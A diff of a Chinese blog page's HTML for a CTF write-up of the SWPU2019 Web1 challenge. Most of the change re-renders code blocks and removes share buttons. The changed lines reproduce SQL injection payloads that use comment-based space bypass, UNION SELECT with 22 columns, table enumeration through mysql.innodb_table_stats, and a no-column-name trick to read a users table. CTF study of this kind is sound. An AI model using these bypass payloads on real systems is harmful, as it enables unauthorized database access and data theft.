@@ -106,30 +106,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&text=SWPU2019 Web1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&title=SWPU2019 Web1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&is_video=false&description=SWPU2019 Web1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=SWPU2019 Web1&body=Check out this article: https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&title=SWPU2019 Web1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&title=SWPU2019 Web1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&title=SWPU2019 Web1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&title=SWPU2019 Web1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&name=SWPU2019 Web1&description=&lt;p&gt;题目地址：&lt;a href=&#34;https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1&#34;&gt;Web1&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/13/SWPU2019%20Web1/&t=SWPU2019 Web1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">解题</span></a></li></ol>
     </div>
@@ -156,8 +138,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-12T16:00:00.000Z" itemprop="datePublished">2022-04-13</time>
-        
-        (Updated: <time datetime="2022-04-13T03:16:26.496Z" itemprop="dateModified">2022-04-13</time>)
         
       
     </div>
@@ -203,17 +183,16 @@
 <li>无列名注入</li>
 </ul>
 <p>[[information_schema绕过及无列名注入]]</p>
-<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;23,&#39;1
--1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
 <p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
-<p>接着，查询数据库名： <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
-<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
 <p>（flag在<code>users</code>中）</p>
-<p>接着利用<strong>无列名注入</strong>获得列名： <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(c)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;c&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
 <p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
 <p>最终得到flag：</p>
@@ -274,7 +253,6 @@
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
